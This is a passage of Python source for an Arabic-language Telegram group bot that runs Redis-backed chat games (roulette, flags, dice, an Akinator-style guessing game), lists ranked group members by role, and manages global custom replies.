       return m.reply(f"{k} مافيه لاعبين")
     else:
       ids = [elem for elem in r.smembers(f'{m.chat.id}:ListRolet:{Dev_Zaid}')]
       id = random.choice(ids)
       getUser = c.get_users(int(id))
       m.reply(f"{k} مبروك اخترت اللاعب ( {getUser.mention} ) واخذ 3 مجوهرات")
       if not r.get(f'{getUser.id}:Floos'):
         floos = 0
       else:
         floos = int(r.get(f'{getUser.id}:Floos'))
       r.set(f"{getUser.id}:Floos",floos+10)
       r.delete(f'{m.chat.id}:ListRolet:{Dev_Zaid}')
       r.delete(f'{m.chat.id}:ROLETGAME:{Dev_Zaid}')
       return True
       
  
   if text == 'خواتم':
     name = random.randint(1,6)
     r.set(f'{m.chat.id}:game5tm:{m.from_user.id}{Dev_Zaid}', name ,ex=600)
     r.delete(f'{m.chat.id}:game:{Dev_Zaid}')
     return m.reply('''
１    ２      ３     ４    ５     ６
  ↓     ↓      ↓     ↓     ↓     ↓
  ✋🏼 ‹› ✋🏼 ‹› ✋🏼 ‹› ✋🏼 ‹› ✋🏼 ‹› ✋🏼
  
  
⚘ اختار اليد اللي تتوقع فيها الخاتم
     ''')
   
   if text == 'اعلام':
     country=random.choice(countries_)
     name = country['name']
     flag=country['flag']
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name,ex=600)
     m.reply_photo(flag, caption='ايش اسم الدولة ؟')
     return True
   
   if text == 'دين':
     dee = random.choice(deen)
     question = dee['question']
     answer = dee['answer']
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', answer ,ex=600)
     m.reply(question)
     return True
   
   if text == 'سيارات':
     car = random.choice(cars)
     brand = car["brand"]
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', brand ,ex=600)
     m.reply_photo(car['photo'], caption='وش اسم السيارة ؟')
     return True
   
   if text == 'ارقام':
     num = ''
     for a in range(random.randint(5,15)):
       num += str(random.randint(1,9))
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', num ,ex=600)
     m.reply(f'الرقم ↢ ( {num} )', protect_content=True)
     return True
     
   if text == 'انمي':
     anim = random.choice(anime)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', anim['anime'] ,ex=600)
     m.reply_photo(anim['photo'], caption='ايش اسم شخصية الانمي ؟')
     return True
   
   if text == 'صور':
     ph = random.choice(pics)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', ph['answer'] ,ex=600)
     if not ph['caption']:
       caption = 'وش الي فالصورة؟'
     else:
       caption = ph['caption']
     m.reply_photo(ph['photo'], caption=caption)
     return True
   
   if text == 'كرة قدم' or text == 'كره قدم':
     ph = random.choice(football)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', ph['answer'] ,ex=600)
     if not ph['caption']:
       caption = 'وش اسم الاعب ؟'
     else:
       caption = ph['caption']
     m.reply_photo(ph['photo'], caption=caption)
     return True
   
   if text == 'تشفير':
     ph = random.choice(tashfeer)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', ph['answer'] ,ex=600)
     if not ph['caption']:
       caption = 'فك التشفير ؟'
     else:
       caption = ph['caption']
     m.reply_photo(ph['photo'], caption=caption)
     return True
   
   if text == 'تركيب':
     name = random.choice(tarkeeb)
     name1 = name
     name = re.sub("اناث", "ا ن ا ث", name)
     name = re.sub("ثيران", "ث ي ر ا ن", name)
     name = re.sub("دروس", "د ر و س", name)
     name = re.sub("فحص", "ف ح ص", name)
     name = re.sub("رجال", "ر ج ا ل", name)
     name = re.sub("انستا", "ا ن س ت ا", name)
     name = re.sub("ضغوط", "ض غ و ط", name)
     name = re.sub("صف", "ص ف", name)
     name = re.sub("رجب", "ر ج ب", name)
     name = re.sub("اسد", "ا س د", name)
     name = re.sub("وقع", "و ق ع", name)
     name = re.sub("ملك", "م ل ك", name)
     name = re.sub("فصل", "ف ص ل", name)
     name = re.sub("كلاب", "ك ل ا ب", name)
     name = re.sub("صقور", "ص ق و ر", name)
     name = re.sub("عقد", "ع ق د", name)
     name = re.sub("بحور", "ب ح و ر", name)
     name = re.sub("هاتف", "ه ا ت ف", name)
     name = re.sub("حدائق", "ح د ا ئ ق", name)
     name = re.sub("مسرح", "م س ر ح", name)
     name = re.sub("جرائم", "ج ر ا ئ م", name)
     name = re.sub("مدارس", "م د ا ر س", name)
     name = re.sub("منزل", "م ن ز ل", name)
     name = re.sub("كرسي", "ك ر س ي", name)
     name = re.sub("مناطق", "م ن ا ط ق", name)
     name = re.sub("بيوت", "ب ي و ت", name)
     name = re.sub("بنك", "ب ن ك", name)
     name = re.sub("علم", "ع ل م", name)
     name = re.sub("وظائف", "و ظ ا ئ ف", name)
     name = re.sub("طلاب", "ط ل ا ب", name)
     name = re.sub("مراحل", "م ر ا ح ل", name)
     name = re.sub("فنانين", "ف ن ا ن ي ن", name)
     name = re.sub("صواريخ", "ص و ا ر ي خ", name)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name1,ex=600)
     m.reply(f'ركب ↢ ( {name} )')
   
   if text == "سكب ديمون":
    if m.from_user.id in users_demon:
        del users_demon[m.from_user.id]
        return m.reply("⇜ ابشر الغيت اللعبة")
    else:
        return m.reply("⇜ مافيه لعبة ديمون شغالة")
        
   if text == 'حجره' or text == 'حجرة':
     return m.reply('- اختار حجره / ورقة / مقص',reply_markup=InlineKeyboardMarkup (
     [
     [
       InlineKeyboardButton ('🪨', callback_data=f'RPS:rock++{m.from_user.id}'),
       InlineKeyboardButton ('📃', callback_data=f'RPS:paper++{m.from_user.id}'),
       InlineKeyboardButton ('✂️', callback_data=f'RPS:scissors++{m.from_user.id}'),
     ]
     ]
     ))
   
   if text == 'نرد':
     dice = c.send_dice(m.chat.id,"🎲",reply_to_message_id=m.id,
     reply_markup=InlineKeyboardMarkup (
       [[
         InlineKeyboardButton ("🧚‍♀️",url=f"t.me/{channel}")
       ]]
     ))
     if dice.dice.value == 6:
        ra = 10
        if r.get(f'{m.from_user.id}:Floos'):
           get = int(r.get(f'{m.from_user.id}:Floos'))
           r.set(f'{m.from_user.id}:Floos',get+ra)
           floos = int(r.get(f'{m.from_user.id}:Floos'))
        else:
           floos = ra
           r.set(f'{m.from_user.id}:Floos',ra)
        return m.reply(f'''
صح عليك فزت **[بالنرد]({dice.link})** ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮✔
💸فلوسك: `{floos}` ريال
☆
''', disable_web_page_preview=True)
     else:
        return m.reply(f"{k} للأسف خسرت بالنرد")
       
   
   if text == 'ديمون':
     if m.from_user.id in users_demon:
        return m.reply("⇜ في لعبة ديمون شغالة استخدم امر <code>سكب ديمون</code>")
     else:
        return m.reply(f'''بوو 👻
انا ديمون 🧛🏻‍♀️ اقدر اعرف مين الشخصية الي فبالك !

- فكر بشخص واضغط بدء وجاوب على اسئلتي''',
     reply_markup=InlineKeyboardMarkup (
       [
       [
        InlineKeyboardButton ('بدء 🧛🏻‍♀️',callback_data=f'start_aki:{m.from_user.id}')
       ]
       ]
     ))

@Client.on_callback_query(filters.regex('aki'))
def akinatorHandler(c,m):
   channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
   if m.data == f'start_aki:{m.from_user.id}':
    rep = InlineKeyboardMarkup (
         [[InlineKeyboardButton ('🧚‍♀️', url=f't.me/{channel}')]]
       )
    m.edit_message_text("⇜ جاري بدء اللعبة...",reply_markup=rep)
    aki= akinator.Akinator()
    q = aki.start_game(language="ar")
    users_demon.update({m.from_user.id:[aki,q]})
    return m.edit_message_text(users_demon[m.from_user.id][1],
     reply_markup=InlineKeyboardMarkup (
       [
       [
         InlineKeyboardButton ('لا', callback_data=f'aki_c:n++{m.from_user.id}'),
         InlineKeyboardButton ('اي', callback_data=f'aki_c:y++{m.from_user.id}'),
       ],
       [
        InlineKeyboardButton ('ممكن',callback_data=f'aki_c:p++{m.from_user.id}')
       ]
       ]
     ))
   if m.data == f'aki_c:n++{m.from_user.id}':
    users_demon[m.from_user.id][1] = users_demon[m.from_user.id][0].answer("n")
    if users_demon[m.from_user.id][0].progression >= 65:
        users_demon[m.from_user.id][0].win()
        str_to_send = users_demon[m.from_user.id][0].first_guess
        print(str_to_send)
        m.message.delete()
        rep = InlineKeyboardMarkup (
         [[InlineKeyboardButton ('🧚‍♀️', url=f't.me/{channel}')]]
         )
        try: c.send_photo(m.message.chat.id,str_to_send['absolute_picture_path'],caption=f"{str_to_send['name']} - {str_to_send['description']}",reply_markup=rep)
        except: c.send_message(m.message.chat.id,f"{str_to_send['name']} - {str_to_send['description']}",reply_markup=rep)
        del users_demon[m.from_user.id]
    else:
        return m.edit_message_text(users_demon[m.from_user.id][1],
     reply_markup=InlineKeyboardMarkup (
       [
       [
         InlineKeyboardButton ('لا', callback_data=f'aki_c:n++{m.from_user.id}'),
         InlineKeyboardButton ('اي', callback_data=f'aki_c:y++{m.from_user.id}'),
       ],
       [
        InlineKeyboardButton ('ممكن',callback_data=f'aki_c:p++{m.from_user.id}')
       ]
       ]
     ))
   if m.data == f'aki_c:y++{m.from_user.id}':
    users_demon[m.from_user.id][1] = users_demon[m.from_user.id][0].answer("y")
    if users_demon[m.from_user.id][0].progression >= 65:
        users_demon[m.from_user.id][0].win()
        str_to_send = users_demon[m.from_user.id][0].first_guess
        print(str_to_send)
        m.message.delete()
        rep = InlineKeyboardMarkup (
         [[InlineKeyboardButton ('🧚‍♀️', url=f't.me/{channel}')]]
         )
        try: c.send_photo(m.message.chat.id,str_to_send['absolute_picture_path'],caption=f"{str_to_send['name']} - {str_to_send['description']}",reply_markup=rep)
        except: c.send_message(m.message.chat.id,f"{str_to_send['name']} - {str_to_send['description']}",reply_markup=rep)
        del users_demon[m.from_user.id]
    else:
        return m.edit_message_text(users_demon[m.from_user.id][1],
     reply_markup=InlineKeyboardMarkup (
       [
       [
         InlineKeyboardButton ('لا', callback_data=f'aki_c:n++{m.from_user.id}'),
         InlineKeyboardButton ('اي', callback_data=f'aki_c:y++{m.from_user.id}'),
       ],
       [
        InlineKeyboardButton ('ممكن',callback_data=f'aki_c:p++{m.from_user.id}')
       ]
       ]
     ))
   if m.data == f'aki_c:p++{m.from_user.id}':
    users_demon[m.from_user.id][1] = users_demon[m.from_user.id][0].answer("p")
    if users_demon[m.from_user.id][0].progression >= 65:
        users_demon[m.from_user.id][0].win()
        str_to_send = users_demon[m.from_user.id][0].first_guess
        print(str_to_send)
        m.message.delete()
        rep = InlineKeyboardMarkup (
         [[InlineKeyboardButton ('🧚‍♀️', url=f't.me/{channel}')]]
         )
        try: c.send_photo(m.message.chat.id,str_to_send['absolute_picture_path'],caption=f"{str_to_send['name']} - {str_to_send['description']}",reply_markup=rep)
        except: c.send_message(m.message.chat.id,f"{str_to_send['name']} - {str_to_send['description']}",reply_markup=rep)
        del users_demon[m.from_user.id]
    else:
        return m.edit_message_text(users_demon[m.from_user.id][1],
     reply_markup=InlineKeyboardMarkup (
       [
       [
         InlineKeyboardButton ('لا', callback_data=f'aki_c:n++{m.from_user.id}'),
         InlineKeyboardButton ('اي', callback_data=f'aki_c:y++{m.from_user.id}'),
       ],
       [
        InlineKeyboardButton ('ممكن',callback_data=f'aki_c:p++{m.from_user.id}')
       ]
       ]
     ))


def get_emoji_bank(count):
  if count == 1:
     return '🥇 ) '
  if count == 2:
     return '🥈 ) '
  if count == 3:
     return '🥉 ) '
  else:
     return f' {count}  ) '
     
     
# ==================== FILE: get_ranks.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''


@Client.on_message(filters.text & filters.group, group=12)
def getRanksHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=get_ranks_func,args=(c,m,k,channel)).start()
    
def get_ranks_func(c,m,k,channel):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
    
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   if text == 'قائمه Dev':
      if not devp_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( Dev🎖️) بس')
      else:
        if not r.smembers(f'{Dev_Zaid}DEV2'):
           return m.reply(f'{k} مافيه قائمة  Dev²🎖️')
        else:
          text = '- قائمة  Dev²🎖:\n\n'
          count = 1
          for dev2 in r.smembers(f'{Dev_Zaid}DEV2'):
             if count == 101: break
             try:
               user = c.get_users(int(dev2))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(dev2)})'
               id = int(dev2)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
   
   if text == 'قائمه MY':
      if not dev2_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( Dev²🎖️ وفوق ) بس')
      else:
        if not r.smembers(f'{Dev_Zaid}DEV'):
          return m.reply(f'{k}  مافيه Myth🎖️ ')
        else:
          text = '- قائمة Myth🎖️:\n\n'
          count = 1
          for dev in r.smembers(f'{Dev_Zaid}DEV'):
             if count == 101: break
             try:
               user = c.get_users(int(dev))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(dev)})'
               id = int(dev)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
          
   cid = m.chat.id
   if text == 'المالكين الاساسيين':
      if not dev_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المطور وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listGOWNER:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مالكين اساسيين ')
        else:
          text = '- المالكين الاساسيين:\n\n'
          count = 1
          for gowner in r.smembers(f'{cid}:listGOWNER:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(gowner))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(gowner)})'
               id = int(gowner)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
          
   if text == 'المالكين':
      if not gowner_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المالك الاساسي ) بس')
      else:
        if not r.smembers(f'{cid}:listOWNER:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مالكيين ')
        else:
          text = '- المالكيين:\n\n'
          count = 1
          for owner in r.smembers(f'{cid}:listOWNER:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(owner))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(owner)})'
               id = int(owner)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
   
   if text == 'المدراء':
      if not owner_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listMOD:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مدراء ')
        else:
          text = '- المدراء:\n\n'
          count = 1
          for mod in r.smembers(f'{cid}:listMOD:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(mod))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(mod)})'
               id = int(mod)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
   
   if text == 'الادمنيه':
      if not mod_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listADMIN:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه ادمن ')
        else:
          text = '- الادمنيه:\n\n'
          count = 1
          for ADM in r.smembers(f'{cid}:listADMIN:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(ADM))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(ADM)})'
               id = int(ADM)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
   
   if text == 'المشرفين':
      if not owner_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
      else:
          text = '- المشرفين:\n\n'
          count = 1
          for mm in m.chat.get_members(filter=ChatMembersFilter.ADMINISTRATORS):
            if count == 101: break
            if not mm.user.is_deleted and not mm.user.is_bot:
               id = mm.user.id
               username = mm.user.username
               if mm.user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ [@{channel}](tg://user?id={id}) ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
   
   if text == 'المميزين':
      if not admin_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listPRE:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مميزين ')
        else:
          text = '- المميزين:\n\n'
          count = 1
          for PRE in r.smembers(f'{cid}:listPRE:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(PRE))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(PRE)})'
               id = int(PRE)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
   
   if text == 'المكتومين':
      if not mod_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
      else:
        if not r.smembers(f'{cid}:listMUTE:{Dev_Zaid}'):
          return m.reply(f'{k} مافيه مكتومين ')
        else:
          text = '- المكتومين:\n\n'
          count = 1
          for PRE in r.smembers(f'{cid}:listMUTE:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(PRE))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={PRE})'
               id = PRE
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(text)
   
   

             
        
        
# ==================== FILE: globalFilters.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



@Client.on_message(filters.group, group=24)
def addCustomReplyG(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=addreplyg,args=(c,m,k)).start()
    
def addreplyg(c,m,k):
  if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
  if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return 
  if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
  if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
  if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return    
  if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
  if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
  if m.text:
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   
   if r.get(f'{m.chat.id}:addFilterG:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addFilterG:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت اضافة الرد العام')
     return 
   
   if r.get(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت مسح الرد العام')
     return 
   
   if m.text == 'الغاء' and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}'):
       r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
       m.reply(f'{k} من عيوني لغيت اضافة الرد العام')

   if r.get(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      if not r.get(f'{m.text}:filterInfo:{Dev_Zaid}'):
        r.delete(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}')
        return m.reply(f'{k} هذا الرد مو مضاف في قائمة الردود العامه')
      else:
           r.delete(f'{m.text}:filter:{Dev_Zaid}')
           r.delete(f'{m.text}:filtertype:{Dev_Zaid}')
           r.delete(f'{m.text}:filterInfo:{Dev_Zaid}')
           r.srem(f'FiltersList:{Dev_Zaid}', m.text)
           r.delete(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}')
           return m.reply(f'( {m.text} )\n{k} وحذفنا الرد ياحلو')   

   
   if text == 'تعطيل ردود المطور':
     if not owner_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المالك وفوق ) بس')
     if r.get(f'{m.chat.id}:lock_global:{Dev_Zaid}'):
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ردود المطور معطله من قبل\n☆',parse_mode=ParseMode.HTML)
     else:
        r.set(f'{m.chat.id}:lock_global:{Dev_Zaid}',1)
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت ردود المطور\n☆',parse_mode=ParseMode.HTML)
   
   if text == 'تفعيل ردود المطور':
     if not owner_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المالك وفوق ) بس')
     if not r.get(f'{m.chat.id}:lock_global:{Dev_Zaid}'):
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ردود المطور مفعله من قبل\n☆',parse_mode=ParseMode.HTML)
     else:
        r.delete(f'{m.chat.id}:lock_global:{Dev_Zaid}')
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت ردود المطور\n☆',parse_mode=ParseMode.HTML)
   
   if text == 'الردود العامه':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
     else:
      if not r.smembers(f'FiltersList:{Dev_Zaid}'):
       return m.reply(f'{k} مافيه ردود عامه مضافه')
      else:
       text = 'ردود البوت:\n'
       count = 1
       for reply in r.smembers(f'FiltersList:{Dev_Zaid}'):
          rep = reply
          type = r.get(f'{rep}:filtertype:{Dev_Zaid}')
          text += f'\n{count} - ( {rep} ) ࿓ ( {type} )'
          count += 1
       text += '\n☆'
       return m.reply(text, disable_web_page_preview=True,parse_mode=ParseMode.HTML)
  
   if text == 'مسح الردود العامه':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
     else:
      if not r.smembers(f'FiltersList:{Dev_Zaid}'):
        return m.reply(f'{k} مافيه ردود عامه مضافه')
      else:
        total = 0
        for reply in r.smembers(f'FiltersList:{Dev_Zaid}'):
           rep = reply
           r.delete(f'{rep}:filter:{Dev_Zaid}')
           r.delete(f'{rep}:filtertype:{Dev_Zaid}')
           r.delete(f'{rep}:filterInfo:{Dev_Zaid}')
           r.srem(f'FiltersList:{Dev_Zaid}', rep)
           total += 1
        return m.reply(f'{k} ابشر مسحت ( {total} ) من الردود العامه')   
     
   if text == 'مسح رد عام':
     if not r.get(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}'):
      if not dev2_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      else:
        r.set(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}',1)
        m.reply(f'{k} تمام عيني\n{k} الحين ارسل الرد عشان امسحه\n☆',parse_mode=ParseMode.HTML)
        return 
   
   if text == 'اضف رد عام':
       if not r.get(f'{m.chat.id}:addFilterG:{m.from_user.id}{Dev_Zaid}'):
         if not dev2_pls(m.from_user.id, m.chat.id):
           return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
         else:
           m.reply(f'{k} حلو ، الحين ارسل الكلمة اللي تبيها')
           r.set(f'{m.chat.id}:addFilterG:{m.from_user.id}{Dev_Zaid}',1)
           return 
   
   if r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
       text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
       r.set(f'{text}:filter:{Dev_Zaid}', f'type=text&text={m.text.html}')
       r.set(f'{text}:filtertype:{Dev_Zaid}','نص')
       r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
       r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
       r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
       return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
     
   if r.get(f'{m.chat.id}:addFilterG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.set(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}', m.text)
      r.delete(f'{m.chat.id}:addFilterG:{m.from_user.id}{Dev_Zaid}')
      m.reply(f'{k} حلو الحين ارسل جواب الرد\n{k} ( نص,صوره,فيديو,متحركه,بصمه,صوت,ملف )\nـــــــــــــــــــــــــــــــــــــــــ\n`<USER_ID>` › آيدي المستخدم\n`<USER_NAME>` › اسم المستخدم\n`<USER_USERNAME>` › يوزر المستخدم\n`<USER_MENTION>` › رابط حساب المستخدم\n༄',parse_mode=ParseMode.MARKDOWN)
      return 
  
  addreply_media(c,m,k)

def addreply_media(c,m,k):
   if m.photo and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
      type = 'photo'
      photo = m.photo.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
